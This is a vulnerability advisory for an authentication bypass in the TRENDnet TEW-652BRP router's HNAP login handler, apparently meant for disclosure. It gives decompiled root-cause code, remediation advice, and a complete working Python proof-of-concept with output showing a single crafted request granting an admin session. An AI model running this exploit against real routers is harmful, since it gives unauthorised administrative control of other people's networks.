# Vulnerability Report — TRENDnet TEW-652BRP Authentication Bypass 

## 1. Basic Information

- **Vendor / Product:** TRENDnet TEW-652BRP (wireless router), web management interface (`/sbin/httpd`).
- **Affected Versions:** Firmware `v2.0R` (build `2.00`). 
- **Vulnerability Type:** CWE-287 (Improper Authentication).
- **Attack Vector:** Remote (Network), **unauthenticated**. 

## 2. Description

The HNAP login handler `do_agentLogin_action` (route `post_login.xml?hash=*`) validates a client-submitted `hash` of the form `<8-hex salt><32-hex MD5>`. The intended flow: the 8-hex client salt must equal the server's current `login_salt`, and the 32-hex MD5 must equal `MD5(salt | const | password)`.

Due to a control-flow bug, when the client salt does **not** match `login_salt`, the handler does not reject the request. Unless a prior *matching* attempt already raised a timeout flag (`dword_485084`), execution falls through (`goto LABEL_7`) to the **success label**, which registers the attacker's source IP into the login list (`update_logout_list`) and returns a login-success response. The password is never checked. The very first login attempt with any non-matching salt therefore grants an administrator session.

## 3. Root Cause Analysis

Binary: `/sbin/httpd` (MIPS32 BE). Function: `do_agentLogin_action @ 0x404ad0`.

```c
v2 = strchr(a1, '=');                              // "hash=SSSSHHHH..."  S=8hex salt, H=32hex md5
if ( strncasecmp(&login_salt, v2 + 1, 8u) )        // IF client salt != server salt (MISMATCH)
{
    if ( dword_485084 )                            // timeout flag — only set on a PRIOR match+bad-md5
        return "<login>timeout</login>";
    goto LABEL_7;                                  // *** FALLS THROUGH TO SUCCESS ***
}
// salt-matches path: build MD5(salt_be | const_be | password), compare 32 hex
memset(v36, 1, sizeof(v36));
v36[1] = _byteswap_ulong(dword_4D41C8);
v36[0] = _byteswap_ulong(*(unsigned int *)&login_salt);
memcpy(&v36[2], admin_passwd, strlen(admin_passwd));
md5_create_digest(v36, 64, v38);
sprintf(v37, "%08x%08x%08x%08x", v38[0], v38[1], v38[2], v38[3]);
if ( !strncasecmp(v37, v2 + 9, 0x20u) )            // IF md5 matches
{
LABEL_7:                                           // <<< SHARED SUCCESS LABEL
    update_logout_list(&dword_48969C, 0, 0);       // whitelists attacker source IP/MAC
    sprintf(v23, "<login>%s</login>", nvram_safe_get("default_html"));
    dword_485084 = 0;
    return result;                                 // login success
}
puts("password error ");
strcat(v35, "<login>error</login>");
dword_485084 = 1;                                  // only here is the timeout flag ever set
```

## 4. Proof of Concept

```python 
import argparse, sys
import requests


ENDPOINTS = [
    "/status.asp",
    "/wireless_basic.asp",
    "/wireless_auth.asp",
    "/lan.asp",
    "/wan.asp",
    "/password.asp",
    "/firmware.asp",
    "/filters.asp",
    "/ddns.asp",
    "/remote_management.asp",
]


def _is_js_redirect_to_login(text):
    """True if response is a JS redirect to login.asp (auth-blocked)."""
    t = (text or "").lower()
    return ("login.asp" in t and "document.location" in t) or \
           ("login.asp" in t and "redirect" in t and len(t) < 600)


def _resp_classify(r):
    """Classify a page response."""
    t = r.text or ""
    if _is_js_redirect_to_login(t):
        return "BLOCKED"
    if len(t) > 800:
        return "FULL_PAGE"
    if len(t) == 0:
        return "EMPTY"
    return "OTHER"


def _probe(sess, base, endpoint, timeout):
    r = sess.get(base + endpoint, timeout=timeout, allow_redirects=True)
    return r, _resp_classify(r)


def main():
    ap = argparse.ArgumentParser(
        description="TEW-652BRP Tr1 auth bypass PoC")
    ap.add_argument("--target", default="http://172.17.0.4")
    ap.add_argument("--endpoints", "-e", nargs="*",
                    help="endpoints to probe (default: 10 common ASP pages)")
    ap.add_argument("--salt", default="00000000",
                    help="non-matching 8-hex salt to send in post_login.xml")
    ap.add_argument("--timeout", type=int, default=5)
    a = ap.parse_args()
    base = a.target.rstrip("/")
    eps = [ep if ep.startswith("/") else "/" + ep
           for ep in (a.endpoints if a.endpoints else ENDPOINTS)]

    sess = requests.Session()
    print(f"[*] Target: {base}")
    print(f"[*] Protected endpoints: {len(eps)}")

    print()
    print("== Stage 1: pre-auth protected endpoint probe ==")
    pre = []
    for ep in eps:
        r, cls = _probe(sess, base, ep, a.timeout)
        pre.append((ep, r, cls))
        print(f"  {ep:35s} HTTP {r.status_code:<3d} {cls:10s} {len(r.text)}B")

    print()
    print("== Stage 2: send salt-mismatch login bypass ==")
    md5 = "a" * 32
    url = f"{base}/post_login.xml?hash={a.salt}{md5}"
    r = sess.get(url, timeout=a.timeout)
    bypass_ok = "<login>" in r.text and "error" not in r.text and "timeout" not in r.text
    print(f"  GET /post_login.xml?hash={a.salt}{md5[:8]}... -> HTTP {r.status_code}")
    print(f"  body: {r.text.strip()[:240]}")
    if not bypass_ok:
        print("[-] Bypass rejected: target may be patched or not TEW-652BRP v2.00.")
        sys.exit(1)

    print()
    print("== Stage 3: post-bypass protected endpoint probe ==")
    results = []
    for ep, r_pre, cls_pre in pre:
        r_post, cls_post = _probe(sess, base, ep, a.timeout)

        changed = "DIFFER" if (r_pre.status_code != r_post.status_code or
                               len(r_pre.text) != len(r_post.text) or
                               cls_pre != cls_post) else "SAME"

        results.append((ep, cls_pre, cls_post, changed, r_pre, r_post))

        print(f"  {ep:35s} before={cls_pre:10s} after={cls_post:10s} {changed}")
        if changed == "DIFFER":
            print(f"    PRE  ({r_pre.status_code}, {len(r_pre.text)}B): {r_pre.text.strip()[:200]}")
            print(f"    POST ({r_post.status_code}, {len(r_post.text)}B): {r_post.text.strip()[:200]}")

    print()
    accessible_after = [r for r in results if r[2] in ("FULL_PAGE", "OTHER")]
    changed_pairs = [r for r in results if r[3] == "DIFFER"]

    if changed_pairs and accessible_after:
        print("[+] VERIFIED: invalid salt reached the login-success path and protected endpoints are accessible.")
        for ep, pre, post, _, r_pre, r_post in changed_pairs:
            print(f"    {ep}: {pre} -> {post}")
        sys.exit(0)

    print("[-] Bypass response was accepted, but protected endpoint access was not verified.")
    sys.exit(1)


if __name__ == "__main__":
    main()
```
```bash
$ python3 poc_tew652brp_tr1_auth_bypass.py --target http://192.168.10.1 -e /status.asp /wireless_basic.asp
[*] Target: http://192.168.10.1
[*] Protected endpoints: 2

== Stage 1: pre-auth protected endpoint probe ==
  /status.asp                         HTTP 200 BLOCKED    148B
  /wireless_basic.asp                 HTTP 200 BLOCKED    148B

== Stage 2: send salt-mismatch login bypass ==
  GET /post_login.xml?hash=00000000aaaaaaaa... -> HTTP 200
  body: <?xml version="1.0" encoding="UTF-8" standalone="yes" ?><login>index.asp</login>

== Stage 3: post-bypass protected endpoint probe ==
  /status.asp                         before=BLOCKED    after=FULL_PAGE  DIFFER
  /wireless_basic.asp                 before=BLOCKED    after=FULL_PAGE  DIFFER

[+] VERIFIED: invalid salt reached the login-success path and protected endpoints are accessible.
```


## 5. Impact

Unauthenticated, full administrative access to the router's web management interface. An attacker on the network (or WAN if remote management is enabled) gains admin with a single request — read/modify configuration, change admin/Wi-Fi credentials, alter DNS, flash firmware, and pivot into the LAN.

## 6. Remediation

On a salt mismatch, the handler must **reject** the login (return `<login>error</login>` and increment the fail counter) — never fall through to the success label. Concretely, restructure so the success label is reachable *only* from the MD5-matches branch; ensure the password-derived MD5 is always verified before `update_logout_list` is called. Add negative-path unit tests covering the
mismatch case.
